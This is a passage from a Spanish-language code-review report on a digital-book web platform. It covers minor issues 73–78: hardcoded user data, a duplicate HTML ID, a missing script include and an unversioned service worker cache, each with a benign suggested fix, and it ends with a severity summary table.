`reader.html` no incluye `<script src="js/api.js">`. Si `reader.js` necesita hacer peticiones a la API (guardar progreso, obtener datos del libro), no tendrá acceso a `API_URL` ni a las funciones de `api.js`.

**Solución sugerida:**
```html
<!-- Añadir antes de reader.js: -->
<script src="js/api.js"></script>
<script src="js/reader.js"></script>
```

---

### Error 74 — book-detail.html rating/votos/visitas hardcodeados

- **Severidad:** 🟢 LEVE  
- **Categoría:** HTML / Datos hardcodeados  
- **Archivo:** `frontend/book-detail.html`  
- **Descripción y Justificación técnica:**  
`book-detail.html` muestra rating, votos y visitas con valores estáticos en el HTML (ej: "4.5", "120 votos", "0 visitas"). Estos valores no se actualizan desde el backend, mostrando siempre los mismos datos para todos los libros.

**Solución sugerida:**
```html
<!-- Placeholders: -->
<span id="bookRating">—</span>
<span id="bookVotes">—</span>
<span id="bookViews">—</span>
```
```js
// bookDetail.js rellena desde la API
document.getElementById("bookRating").textContent = book.rating || "N/A";
document.getElementById("bookVotes").textContent = `${book.votes || 0} votos`;
document.getElementById("bookViews").textContent = `${book.views || 0} visitas`;
```

---

### Error 75 — book-detail.html email "visitante" hardcodeado

- **Severidad:** 🟢 LEVE  
- **Categoría:** HTML / Datos hardcodeados  
- **Archivo:** `frontend/book-detail.html`  
- **Descripción y Justificación técnica:**  
`book-detail.html` muestra "visitante" como email del usuario. Si el usuario está logueado, debería mostrar su email real. Si no lo está, debería mostrar "Invitado" o un botón de login.

**Solución sugerida:**
```js
// bookDetail.js
const user = JSON.parse(localStorage.getItem("user") || "{}");
document.getElementById("userEmail").textContent = user.email || "Invitado";
```

---

### Error 76 — my-list.html y read-books.html ID duplicado "myListGrid"

- **Severidad:** 🟢 LEVE  
- **Categoría:** HTML / Validación  
- **Archivos:** `frontend/my-list.html`, `frontend/read-books.html`  
- **Descripción y Justificación técnica:**  
Ambos archivos usan `id="myListGrid"` para su contenedor principal. Los IDs deben ser únicos en todo el documento HTML. Aunque están en páginas diferentes, si alguna vez se combinan o se cargan juntas, habrá conflictos. Además, `read-books.html` debería usar un ID más descriptivo como `readBooksGrid`.

**Solución sugerida:**
```html
<!-- read-books.html -->
<div id="readBooksGrid" class="grid"></div>
```

---

### Error 77 — settings.html email admin y rol hardcodeados

- **Severidad:** 🟢 LEVE  
- **Categoría:** HTML / Datos hardcodeados  
- **Archivo:** `frontend/settings.html`  
- **Descripción y Justificación técnica:**  
`settings.html` muestra "admin@tercero.com" y "Administrador" como email y rol del usuario. Estos valores son estáticos y no reflejan el usuario logueado. Cualquier usuario que abra settings verá "admin@tercero.com".

**Solución sugerida:**
```html
<!-- Placeholders: -->
<span id="userEmail">—</span>
<span id="userRole">—</span>
```
```js
// settings.js
const user = JSON.parse(localStorage.getItem("user") || "{}");
document.getElementById("userEmail").textContent = user.email || "N/A";
document.getElementById("userRole").textContent = user.role || "N/A";
```

---

### Error 78 — sw.js sin versionado de cache ni fallback offline

- **Severidad:** 🟢 LEVE  
- **Categoría:** PWA / Service Worker  
- **Archivo:** `frontend/sw.js`  
- **Descripción y Justificación técnica:**  
`sw.js` no tiene versionado de cache (no hay `CACHE_VERSION` ni `CACHE_NAME` dinámico). Cuando se actualiza la app, los usuarios pueden recibir contenido stale porque el service worker sirve desde cache sin verificar si hay una versión nueva. Además, no tiene fallback offline para rutas no cacheadas (si el usuario está offline y pide una página no cacheada, ve error en lugar de una página offline).

**Solución sugerida:**
```js
const CACHE_VERSION = "v1.0.0";
const CACHE_NAME = `tercero-${CACHE_VERSION}`;
const OFFLINE_URL = "/offline.html";

// Instalar: pre-cachea recursos
self.addEventListener("install", (e) => {
  e.waitUntil(
    caches.open(CACHE_NAME).then((cache) =>
      cache.addAll(["/", "/index.html", "/offline.html", "/css/style.css"])
    )
  );
  self.skipWaiting(); // Activar nuevo SW inmediatamente
});

// Activar: elimina caches viejas
self.addEventListener("activate", (e) => {
  e.waitUntil(
    caches.keys().then((keys) =>
      Promise.all(
        keys.filter((k) => k !== CACHE_NAME).map((k) => caches.delete(k))
      )
    )
  );
  self.clients.claim();
});

// Fetch: network-first con fallback a cache y offline
self.addEventListener("fetch", (e) => {
  e.respondWith(
    fetch(e.request)
      .then((res) => {
        const copy = res.clone();
        caches.open(CACHE_NAME).then((cache) => cache.put(e.request, copy));
        return res;
      })
      .catch(() =>
        caches.match(e.request).then((cached) => cached || caches.match(OFFLINE_URL))
      )
  );
});
```

---

## ✅ Fin del listado — 78 errores identificados

| Severidad | Cantidad | Rango |
|-----------|----------|-------|
| 🔴 CRÍTICOS / SEGURIDAD | 24 | 1–24 |
| 🟠 GRAVES / FUNCIONALES | 30 | 25–54 |
| 🟡 MODERADOS / ARQUITECTURA | 12 | 55–66 |
| 🟢 LEVES / HTML-PWA | 12 | 67–78 |
| **TOTAL** | **78** | |

---

*Documento generado el 2025-01-20 — Revisión completa de código (frontend + backend)*  
*Proyecto: TERCERO-SOFWARE — Plataforma de libros digitales*
